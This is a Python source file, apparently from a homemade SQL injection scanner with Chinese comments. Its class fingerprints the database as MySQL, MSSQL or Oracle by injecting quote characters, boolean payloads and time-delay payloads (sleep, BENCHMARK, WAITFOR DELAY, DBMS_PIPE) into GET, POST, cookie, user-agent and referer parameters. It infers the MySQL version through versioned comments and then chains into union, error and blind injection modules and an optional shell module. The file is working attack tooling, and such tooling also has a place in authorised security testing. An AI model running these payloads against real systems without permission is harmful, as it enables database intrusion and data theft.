from lib.core.settings import RANDOM_NUMBER_MARKER
from lib.core.settings import MYSQL_ERROR
from lib.core.settings import ORACLE_ERROR
from lib.core.settings import MSSQL_ERROR
from lib.core.settings import BOUNDARIES_FILE_NAME
from lib.core.settings import DETECTED_FILE_NAME
from data.json_file import get_json
from dbms.check_union import CheckUnion
from dbms.check_error import CheckError
from dbms.check_blind import CheckBlind
from dbms.check_shell import CheckShell
from lib.core.settings import UNION_DETECTED, ERROR_DETECTED, BOOL_DETECTED, TIME_DETECTED, STACK_DETECTED, SQLITE_FILE_NAME
from lib.utils.cache import Cache

class CheckDbms:
    def __init__(self, urls, log, level="low", shell=None):
        self.urls = urls
        self.log = log
        self.level = level
        self.boundaries = get_json(BOUNDARIES_FILE_NAME, level)
        self.top_boundaries = []
        self.version = ""
        self.db = ""
        # 保存检测出注入的参数下标
        self.id = 0
        # 检测注入的优先级集合,默认是union,error,bool,time,stack
        self.sql_dectected_set = [
            UNION_DETECTED, ERROR_DETECTED, BOOL_DETECTED, TIME_DETECTED, STACK_DETECTED
        ]
        self.top_dectected = ""
        self.shell = shell
        # post请求的data
        if self.urls.data != "":
            self.data = self.urls.data

    def check_by_error(self, param, db_name):
        '''
            根据报错信息判断数据库类型
            返回是否有报错信息和数据库类型
        '''
        # 构造简单的报错语法
        payloads = ["'", "\""]
        if db_name == "mysql":
            key_words = MYSQL_ERROR
        elif db_name == "mssql":
            key_words = MSSQL_ERROR
        elif db_name == "oracle":
            key_words = ORACLE_ERROR

        for payload in payloads:
            # url = self.urls.url_replacer_all(payload)
            url = self.urls.url_replacer(param["key"], param["value"], param["value"] + payload)
            result = self.urls.check_keywords(url, key_words)
            if result:  
                self.db = db_name
                self.top_dectected = ERROR_DETECTED
                return True

    def check_by_bool(self, id, param, db_name):
        '''
            根据每种数据库的布尔表达式进行判断
            returns: bool
        '''
        # 根据payload判断版本号
        detected_payload = get_json(DETECTED_FILE_NAME, db_name)
        url_list, version_list = self.urls.http_request_payloads(param, self.boundaries, detected_payload, True, True)
        for i in range(len(url_list)):
            if self.urls.check_url_page(id, url_list[i]):
                self.version = version_list[i]
                self.db = db_name
                self.id = id
                self.top_boundaries.append(self.boundaries[i%len(self.boundaries)])
                if self.top_dectected=="":
                    self.top_dectected = BOOL_DETECTED
                return True
        return False
        
    def check_by_time(self, id, param, db_name):
        '''
            根据payload检测是否存在时间延时,同上判断数据库类型
            returns : bool
        '''
        # 时间延时payload就几个
        time_payloads = {
            "mysql":
            [
                "and(sleep(6))","and(BENCHMARK(54000000,MD5(1)))",
            ],
            "mssql":
            [
                "WAITFOR DELAY '0:0:6'",
            ],
            "oracle":
            [
                "and(1=(SELECT (CASE WHEN (ascii(substr([DATA],[POSITION],1))=[DATANUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5,ALL_USERS T5) ELSE 222 END) FROM DUAL))",
                "and(1=(DBMS_PIPE.RECEIVE_MESSAGE(1,6)))"
            ]}
        payloads = time_payloads[db_name]
        for payload in payloads:
            url_list = self.urls.http_payload(param, payload, self.boundaries)
            for i in range(len(url_list)):
                url = url_list[i]
                if self.urls.check_url_time(url):
                    self.db = db_name
                    self.id = id
                    self.top_boundaries.append(self.boundaries[i])
                    self.top_dectected = TIME_DETECTED
                    return True
        return False


    def check_by_mysql(self, id):
        '''
            根据MYSQL类型payload进行检测
            returns : (bool)
        '''
        param = self.urls.params[id]
        # f_request = self.urls.f_requests[id]
        # 报错信息判断数据库类型
        error_result = self.check_by_error(param, "mysql")
        if error_result:
            # 亮点:可根据一条payload判断版本号,最精准,这里只精确到中间小数点
            # 缺点是可能其他数据库会误报
            '''
                select version() # 5.7.21-log
                select * from users where id ='1'and 1=1/*!50722 AND 1=2*/; # True
                select * from users where id ='1'and 1=1/*!50721 AND 1=2*/; # False
            '''
            versions_list = (
                # range(32200, 32235),  # MySQL 3.22
                # range(32300, 32359),  # MySQL 3.23
                # range(40000, 40032),  # MySQL 4.0
                # range(40100, 40131),  # MySQL 4.1
                # range(50000, 50097),  # MySQL 5.0
                # range(50100, 50174),  # MySQL 5.1
                # range(50400, 50404),  # MySQL 5.4
                range(50500, 50562),  # MySQL 5.5
                range(50600, 50648),  # MySQL 5.6
                range(50700, 50730),  # MySQL 5.7
                # range(60000, 60014),  # MySQL 6.0
                # range(80000, 80021),  # MySQL 8.0
            )
            for version_list in versions_list:
                for version in version_list:
                    payload = {
                        "expression": "[RANDNUM]=[RANDNUM]/*!%s AND [RANDNUM]=[RANDNUM2]*/" % version, 
                        "version": "{}.{}".format(int(version/10000), version%1000/100)
                        }
                    url_list, version_list = self.urls.http_request_payload(param, self.boundaries, payload, True, True)
                    # print(url_list)
                    for i in range(len(url_list)):
                        # print(url_list[i])
                        if self.urls.check_url_page(id, url_list[i]):                          
                            self.version = version_list[i-1]
                            self.db = "mysql"
                            self.top_boundaries.append(self.boundaries[i])
                            self.id = id
                            return True     
        if self.check_by_bool(id, param, "mysql") or error_result:
            return True
        elif self.check_by_time(id, param, "mysql"):
            return True
        else:
            return False

    def check_by_mssql(self, id):
        '''
            根据MSSQL类型payload进行检测
            returns : (bool)
        '''
        param = self.urls.params[id]
        error_result = self.check_by_error(param, "mssql")
        if self.check_by_bool(id, param, "mssql") or error_result:
            return True
        elif self.check_by_time(id, param, "mssql"):
            return True
        else:
            return False

    def check_by_oracle(self, id):
        '''
            根据ORACLE类型payload进行检测
            returns : (bool)
        '''
        param = self.urls.params[id]
        error_result = self.check_by_error(param, "oracle")
        
        if self.check_by_bool(id, param, "oracle") or error_result:
            return True
        elif self.check_by_time(id, param, "oracle"):
            return True
        else:
            return False
    
    def check_db_by_method(self, method=""):
        '''
            根据不同的方法检测注入,目前有get,post,cookie,ua,referer
            returns: bool
        '''
        if method != "":
            self.urls.method = method
            self.urls.params = self.urls.get_params()
        # 对每一个参数进行检测
        for i in range(len(self.urls.params)):
            if self.urls.method in ["get","post","cookie"]:
                self.log.info('正在检测第%s个%s请求参数' %((i+1),self.urls.method))
            else:
                self.log.info('正在检测%s参数' %(self.urls.method))

            if self.check_by_mysql(i):
                return True
            
            if self.check_by_mssql(i):
                return True

            if self.check_by_oracle(i):
                return True

    def check_db(self):
        '''
            根据不同的数据库进行检测
            returns: 返回(版本号,数据库类型)
        '''
        # 判断是否有本地缓存记录
        cache = Cache(SQLITE_FILE_NAME)
        cache_data = cache.get_cache(self.urls.url)
        if cache_data:
            self.log.debug("查询到本地缓存记录,读取本地缓存记录进行检测")
            self.db = cache_data["db"]
            self.top_boundaries = cache_data["boundaries"]
            self.top_dectected = cache_data["detected_type"]
            self.method_type = cache_data["method_type"]
            result = self.check_db_by_method(self.method_type)
            if result:
                return True

        if self.level == "low":
            # low级别的只测试get和post请求
            return self.check_db_by_method()
        else:
            nomal_result = self.check_db_by_method()
            cache = Cache(SQLITE_FILE_NAME)
            if nomal_result:
                return True
            # high级别还会检测ua和cookie和referer
            result = self.check_db_by_method("cookie")
            if result:
                return True
            result2 = self.check_db_by_method("ua")
            if result2:
                return True
            result3 = self.check_db_by_method("referer")
            if result3:
                return True

    def detected(self):
        # 检测数据库类型和注入类型
        self.log.info("正在检测url:%s" %self.urls.url)        
        if self.check_db():
            self.log.debug("检测出数据库:{},版本号:{},优先注入类型:{}".format(self.db, self.version, self.top_dectected))
            # 设置注入类型优先级
            if self.top_dectected != "":
                self.sql_dectected_set.remove(self.top_dectected)
                self.sql_dectected_set.insert(0, self.top_dectected)
            # 依次检测五种注入类型
            for sql_type in self.sql_dectected_set:
                self.log.info("正在检测注入类型%s" %sql_type)
                if sql_type == UNION_DETECTED:
                    if CheckUnion(self.urls, self.id, self.db, self.log).detected():
                        # continue
                        return True
                elif sql_type == ERROR_DETECTED:
                    if CheckError(self.urls, self.id, self.db, self.top_boundaries, self.log).detected():
                        if self.shell is not None:
                            CheckShell(self.urls, self.id, self.db, self.top_boundaries, self.log).detected()
                        # continue
                        return True
                elif sql_type == BOOL_DETECTED:
                    if CheckBlind(self.urls, self.id, self.db, self.top_boundaries, self.log).detected("bool"):
                        # continue
                        return True
                elif sql_type == TIME_DETECTED:
                    if CheckBlind(self.urls, self.id, self.db, self.top_boundaries, self.log).detected("time"):
                        # continue
                        return True
                elif sql_type == STACK_DETECTED:
                    # 这个是堆叠注入,还没写
                    return True
        return False
        
        
